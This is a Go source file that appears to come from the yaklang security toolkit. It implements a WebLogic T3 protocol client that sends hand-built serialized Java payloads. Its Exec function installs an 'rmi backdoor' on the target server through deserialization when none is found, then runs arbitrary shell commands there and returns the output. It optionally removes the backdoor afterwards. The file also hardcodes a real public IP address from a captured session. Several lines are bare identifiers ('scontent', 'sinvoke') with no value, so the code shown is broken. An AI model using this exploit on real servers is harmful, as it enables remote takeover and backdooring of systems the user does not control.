package t3

import (
	"bytes"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
	"yaklang.io/yaklang/common/log"
	utils2 "yaklang.io/yaklang/common/utils"
	"yaklang.io/yaklang/common/yak/yaklib/codec"
	"yaklang.io/yaklang/common/yserx"
	"yaklang.io/yaklang/common/yso"
)

type T3Paylaod struct {
	Ip            string
	Port          int
	sendedHeader  bool
	invokeId      []byte
	showHeader    func()
	timeout       time.Duration
	clearBackdoor bool
	payload       []byte
	handler       func(string)

	proxy string
}
type OptionFun func(*T3Paylaod)

func NewT3Payload(o ...OptionFun) *T3Paylaod {
	t := &T3Paylaod{sendedHeader: false, showHeader: func() {}, handler: func(s string) {}}
	for _, option := range o {
		option(t)
	}
	return t
}

func (t *T3Paylaod) debugf(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	t.handler(msg)
	log.Info(msg)
}

func (t *T3Paylaod) debug(format string) {
	t.debugf(format)
}

func (t *T3Paylaod) Exec(cmd string) (_ string, err error) {
	defer func() {
		if err1 := recover(); err1 != nil {
			err = utils2.Error(err1)
			return
		}
	}()

	var conn net.Conn
	if t.proxy != "" {
		conn, err = utils2.GetProxyConn(t.addr(), t.proxy, t.timeout)
	} else {
		conn, err = net.DialTimeout("tcp", t.addr(), t.timeout)
	}
	if err != nil {
		return "", err
	}

	t.sendHeader(conn)

	var byt []byte
	var haveBeenTriedForInstallRMI bool = false
	var lookupAmpInstallRMI func() error
	lookupAmpInstallRMI = func() error {
		var err error
		res, err := t.sendContext(conn)
		_ = res
		//print(len(res))

		byt, err = t.sendLookup(conn, "supeream")
		//ioutil.WriteFile("/Users/z3/Downloads/byt", byt, 0666)
		if err != nil {
			return err
		}
		if byt == nil {
			return utils2.Errorf("%v lookup supeream failed: empty", t.addr())
		}

		n := yso.IndexFromBytes(byt, "com.supeream.payload")
		if n == -1 {
			if haveBeenTriedForInstallRMI {
				return utils2.Errorf("%v install rmi backdoor failed", t.addr())
			}
			t.debug("rmi backdoor is not installed, installing...")
			err = t.installRmi()
			haveBeenTriedForInstallRMI = true
			if err != nil {
				log.Warningf("send rmi install paylaod error: %s", err)
			}
			return lookupAmpInstallRMI()
		}

		if haveBeenTriedForInstallRMI {
			t.debugf("install [%v] rmi backdoor successful", conn.RemoteAddr())
		} else {
			t.debugf("rmi [%v] backdoor exist", conn.RemoteAddr())
		}
		return nil
	}

	err = lookupAmpInstallRMI()
	if err != nil {
		return "", err
	}

	i := yso.IndexFromBytes(byt, "\x78\x70\x77\x04")
	if len(byt) < i+8 {
		return "", utils2.Error("cannot found invokeId")
	}
	t.invokeId = byt[i+4 : i+8]
	//println(codec.EncodeToHex(byt))

	//byt := t.Read(readTimeOut)
	//ioutil.WriteFile()
	//t.ShowBytes(readTimeOut)
	byt, err = t.sendInvoke(conn, cmd)
	if err != nil {
		return "", utils2.Errorf("send invoke to[%v] failed: %s", conn.RemoteAddr(), err.Error())
	}
	if len(byt) < 22 {
		return "", utils2.Error("invoke response failed: buffer too small")
	}
	ch1 := int(byt[20]) << 8
	ch2 := int(byt[21])

	// slice 越界
	if len(byt) < 22+ch1+ch2 {
		return "", utils2.Error("fetch invoke result error...")
	}
	res := string(byt[22 : 22+ch1+ch2])
	if t.clearBackdoor {
		t.uninstallRmi()
		t.debug("rmi backdoor has bean uninstalled")
	}
	return res, nil
}

func (t *T3Paylaod) SendPayload(payload []byte) error {
	t.debug("Send payload...")
	var err error
	var conn net.Conn
	if t.proxy != "" {
		conn, err = utils2.GetProxyConn(t.addr(), t.proxy, t.timeout)
	} else {
		conn, err = net.DialTimeout("tcp", t.addr(), t.timeout)
	}
	//conn, err := net.DialTimeout("tcp", addr, t.timeout)
	if err != nil {
		return err
	}
	header := "t3 7.0.0.0\nAS:10\nHL:19\n\n"
	conn.Write([]byte(header))
	//utils2.ReadConnWithTimeout()
	datad := utils2.StableReaderEx(conn, t.timeout, 10240)
	if len(datad) == 0 {
		return errors.New("read empty")
	}
	//println(string(byt))
	//addr := fmt.Sprintf("%s:%d", t.Ip, t.Port)
	//if !t.sendedHeader {
	//	t.sendHeader()
	//	t.sendedHeader = true
	//}

	cmd := "\x08"
	qos := "\x65"
	flags := "\x01"
	responseId := "\xff\xff\xff\xff"
	invokableId := "\xff\xff\xff\xff"
	abbrevOffset := "\x00\x00\x00\x00"
	//countLength := "\x01"
	//capacityLength := "\xfe\x01\x00" //必须大于上面设置的AS值
	capacityLength := "\x10"
	readObjectType := "\x00" //00 object deserial 01 ascii
	data := cmd + qos + flags + responseId + invokableId + abbrevOffset
	data += "\x04"
	writeObj := func(p []byte) {
		data += (capacityLength + readObjectType)
		data += string(p)
	}
	writeObj(payload)
	//authenticatedUser := genAuth("t3", "admin123")
	authenticatedUser := []byte("\xac\xed\x00\x05\x73\x72\x00\x30\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x73\x65\x63\x75\x72\x69\x74\x79\x2e\x61\x63\x6c\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x65\x64\x55\x73\x65\x72\x5c\xf8\xe9\x68\x4f\x73\xeb\x7b\x02\x00\x07\x49\x00\x09\x6c\x6f\x63\x61\x6c\x50\x6f\x72\x74\x42\x00\x03\x71\x6f\x73\x4a\x00\x09\x74\x69\x6d\x65\x53\x74\x61\x6d\x70\x4c\x00\x0b\x69\x6e\x65\x74\x41\x64\x64\x72\x65\x73\x73\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x6e\x65\x74\x2f\x49\x6e\x65\x74\x41\x64\x64\x72\x65\x73\x73\x3b\x4c\x00\x0c\x6c\x6f\x63\x61\x6c\x41\x64\x64\x72\x65\x73\x73\x71\x00\x7e\x00\x01\x4c\x00\x04\x6e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x09\x73\x69\x67\x6e\x61\x74\x75\x72\x65\x74\x00\x02\x5b\x42\x78\x70\xff\xff\xff\xff\x65\x00\x00\x01\x80\x27\x04\x7f\xf5\x70\x70\x74\x00\x08\x77\x65\x62\x6c\x6f\x67\x69\x63\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x00\x10\x31\x4e\x7f\x43\x3b\xd0\x3a\xad\x79\x88\x1c\xc9\x12\x3e\xaa\x2c")
	srcJVMID := []byte("\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1c\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x09\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x83\xb5\x79\x52\x00\x00\x00\x00\x78")
	dstJVMID := []byte("\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x11\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x78")
	writeObj(authenticatedUser)
	writeObj(srcJVMID)
	writeObj(dstJVMID)
	headers := []byte(data)
	l := len(headers) + 4
	bl := yserx.IntTo4Bytes(l)
	req := append(bl, headers...)
	//ioutil.WriteFile("/Users/z3/Downloads/payloadReq.data", req, 0666)
	//p := ""
	//pp, _ := codec.DecodeHex(p)
	conn.Write(req)
	return err
}

func (t *T3Paylaod) uninstallRmi() error {
	scontent
	content, _ := codec.DecodeHex(scontent)
	return t.SendPayload(content)
}

func (t *T3Paylaod) installRmi() error {
	//content, err := ioutil.ReadFile("/Users/z3/Downloads/payload.data")
	scontent
	content, _ := codec.DecodeHex(scontent)
	return t.SendPayload(content)
}

func (t *T3Paylaod) addr() string {
	return utils2.HostPort(t.Ip, t.Port)
}

func (t *T3Paylaod) sendHeader(conn net.Conn) ([]byte, error) {
	t.debugf("Send header Msg to %v", conn.RemoteAddr())
	header := "t3 10.3.1\nAS:255\nHL:19\n\n"
	conn.Write([]byte(header))

	if t.showHeader != nil {
		t.showHeader()
	}
	return t.Read(conn)
}
func (t *T3Paylaod) sendInvoke(conn net.Conn, cmd string) ([]byte, error) {
	t.debugf("Send t3 Invoke Msg to %v", conn.RemoteAddr())
	_, err := conn.Write(t.genInvoke(cmd))
	if err != nil {
		return nil, err
	}
	return t.Read(conn)
}

func (t *T3Paylaod) sendLookup(conn net.Conn, name string) ([]byte, error) {
	t.debugf("Send t3 Lookup Msg to %v", conn.RemoteAddr())
	_, err := conn.Write(t.genLookup(name))
	if err != nil {
		return nil, err
	}
	return t.Read(conn)
	//return utils2.ReadConnWithTimeout(conn, t.timeout)
	//return t.Read(conn)
}
func (t *T3Paylaod) sendContext(conn net.Conn) ([]byte, error) {
	t.debugf("Send t3 Context Msg to %v", conn.RemoteAddr())
	_, err := conn.Write(t.genContext())
	if err != nil {
		return nil, utils2.Errorf("write context error: %s", err)
	}
	return t.Read(conn)
}

func (t *T3Paylaod) Read(conn net.Conn) ([]byte, error) {
	byt := utils2.StableReaderEx(conn, t.timeout, 10240)
	if len(byt) == 0 {
		return byt, errors.New("read empty")
	}
	//byt, err := utils2.ReadConnWithTimeout(conn, t.timeout)
	//if err != nil {
	//	return nil, utils2.Errorf("read conn[%v] failed: %s", t, err)
	//}
	return byt, nil
}

//	func (t *T3Paylaod) ShowBytes(timeout time.Duration) {
//		byt, err := utils2.ReadConnWithTimeout(t.conn, timeout)
//		if err != nil {
//		}
//		println(codec.EncodeToHex(byt))
//	}
//
//	func (t *T3Paylaod) ShowStr(timeout time.Duration) {
//		byt, err := utils2.ReadConnWithTimeout(t.conn, timeout)
//		if err != nil {
//		}
//		println(string(byt))
//	}
func (t *T3Paylaod) genLookup(name string) []byte {
	var payload []byte
	space := "supeream"
	sourceIp := "47.104.229.232"
	//headers := "0000020205650800000002000000090000009D010100740008737570657265616D73720178703F4000000000000877080000000B000000027400186A6176612E6E616D696E672E70726F76696465722E75726C74001874333A2F2F34372E3130342E3232392E3233323A373030317400227765626C6F6769632E6A6E64692E656E61626C65536572766572416666696E69747974000566616C7365787003"
	headers := "05650800000001000000090000009d010100740009737570657265616d73720178703f4000000000000877080000000b000000027400186a6176612e6e616d696e672e70726f76696465722e75726c74001874333a2f2f34372e3130342e3232392e3233323a373030317400227765626c6f6769632e6a6e64692e656e61626c65536572766572416666696e69747974000566616c7365787003fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478707702000078fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707735002f6c6f6f6b7570284c6a6176612e6c616e672e537472696e673b4c6a6176612e7574696c2e486173687461626c653b29000000097878fe00ff"
	headers = "000002" + codec.EncodeToHex(yserx.IntToByte(2+len(t.Ip)-len(sourceIp))) + headers
	headers = strings.Replace(headers, "05650800000001", "056508000000"+codec.EncodeToHex(yserx.IntToByte(1+len(t.Ip)-len(sourceIp))), 1)
	headers = strings.Replace(headers, "000000090000009d", "00000009000000"+codec.EncodeToHex(yserx.IntToByte(157+len(t.Ip)-len(sourceIp))), 1)
	header, err := codec.DecodeHex(headers)
	var buff []byte
	buf := bytes.NewBuffer(buff)
	addr := "t3://47.104.229.232:7001"
	newAddr := "t3://" + t.Ip + ":" + strconv.Itoa(t.Port)
	n := yso.IndexFromBytes(header, addr)
	buf.Write(header[:n-2])
	buf.Write(yserx.IntTo2Bytes(len(newAddr)))
	buf.Write([]byte(newAddr))
	buf.Write(header[n+len(addr):])
	header = buf.Bytes()
	n = yso.IndexFromBytes(header, space)

	buf.Reset()
	buf.Write(header[:n-2])
	buf.Write(yserx.IntTo2Bytes(len(name)))
	buf.Write([]byte(name))
	buf.Write(header[n+len(space):])
	header = buf.Bytes()
	payload = header
	//payload = append(payload, header...)
	//ser, err := yserx.FromJson([]byte(lookupObj0))
	//bobj := yserx.MarshalJavaObjects(ser...)
	//payload = append(payload, writeObject(bobj)...)
	//ser2, err := yserx.FromJson([]byte(lookupObj1))
	//bobj2 := yserx.MarshalJavaObjects(ser2...)
	//payload = append(payload, writeObject(bobj2)...)
	//payload = append(payload, []byte("\xfe\x00\xff")...)
	//ioutil.WriteFile("/Users/z3/Downloads/lookup_go_gen", payload, 0666)

	if err != nil {
		panic(err)
	}

	return payload
}
func (t *T3Paylaod) genContext() []byte {
	addr := "47.104.229.232"

	//content, err := ioutil.ReadFile("/Users/z3/Downloads/context.data")
	scontent
	//scontent := "000005be016501ffffffffffffffff0000006a0000ea600000001900b1558a2679350121a741312e4284312739d2f63e5ed8a009027973720078720178720278700000000a000000030000000000000001007070707070700000000a000000030000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774f210000000000000000000f3139322e3136382e3130312e323131000f3139322e3136382e3130312e323131e0a86c590000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771c012f169d924a1a970100093132372e302e302e3183b579520000000078"
	//scontent := scontentTest
	ll := (len(t.Ip)-len(addr))*2 + 77
	scontent = strings.Replace(scontent, "4D2100", codec.EncodeToHex(yserx.IntToByte(ll))+"2100", -1)
	//scontent = strings.Replace(scontent, "0987B418", "E0A86C59", -1)
	//scontent = strings.Replace(scontent, "F30282C9E61DBBCB", "F0DA16FBBE3225ED", -1)
	//scontent = strings.Replace(scontent, "A9DE37A70000000078", "28C50CAC0000000078", -1)
	content, _ := codec.DecodeHex(scontent)
	var buff []byte
	buf := bytes.NewBuffer(buff)

	n := yso.IndexFromBytes(content, addr)
	buf.Write(content[:n-2])
	buf.Write(yserx.IntTo2Bytes(len(t.Ip)))
	buf.Write([]byte(t.Ip))
	buf.Write(yserx.IntTo2Bytes(len(t.Ip)))
	buf.Write([]byte(t.Ip))
	buf.Write(content[n+(len(addr)+1)*2:])
	content = buf.Bytes()
	lcontext := len(content) + 4
	hexLContext := yserx.IntTo4Bytes(lcontext)

	content = append(hexLContext, content...)
	//ioutil.WriteFile("/Users/z3/Downloads/context_go_gen", content, 0666)
	return content
}

const T3_GENCONTEXT_HEX = "000005C1016501FFFFFFFFFFFFFFFF000000690000EA6000000018604A8CC0BB22DCE5923AAA571F24F825ED8F266D6EFC006D027973720078720178720278700000000A000000030000000000000001007070707070700000000A000000030000000000000001007006"

func (t *T3Paylaod) genContext_() []byte {
	var buf []byte
	paylaod := bytes.NewBuffer(buf)
	header, err := codec.DecodeHex(T3_GENCONTEXT_HEX)
	if err != nil {
		panic(err)
	}
	paylaod.Write(header)
	paylaod.Write(writeObjectFromJson(contextObj0))
	paylaod.Write(writeObjectFromJson(contextObj1))
	paylaod.Write(writeObjectFromJson(contextObj2))
	paylaod.Write(writeObjectFromJson(contextObj3))
	paylaod.Write(writeObjectFromJson(contextObj4))
	paylaod.Write(writeObjectFromJson(contextObj5))
	//ioutil.WriteFile("/Users/z3/Downloads/contextGen.data", paylaod.Bytes(), 0666)
	return paylaod.Bytes()
}
func (t *T3Paylaod) genInvoke(cmd string) []byte {
	space := "whoami"
	sinvoke
	invoke, err := codec.DecodeHex(sinvoke)
	if err != nil {
		panic(err)
	}
	invoke[18] = uint8(35 + len(cmd))
	linvoke := len(invoke)
	var buff []byte
	buf1 := bytes.NewBuffer(buff)
	buf1.Write(yserx.IntTo4Bytes(len(cmd) + 263))
	buf1.Write(invoke[4:11])
	buf1.Write(t.invokeId)
	buf1.Write(invoke[15 : linvoke-9])
	buf1.Write(t.invokeId)
	buf1.Write(invoke[linvoke-5:])
	invoke = buf1.Bytes()
	n := yso.IndexFromBytes(invoke, space)
	var buf []byte
	payload := bytes.NewBuffer(buf)
	//println(codec.EncodeToHex(invoke[:n-10]))
	writeStr := "showmecode" + cmd
	payload.Write(invoke[:n-12])
	payload.Write(yserx.IntTo2Bytes(len(writeStr)))
	payload.Write([]byte(writeStr))
	payload.Write(invoke[n+len(space):])
	//println(codec.EncodeToHex(payload.Bytes()))
	//ioutil.WriteFile("/Users/z3/Downloads/lookupReq.data", payload.Bytes(), 0666)
	return payload.Bytes()
}
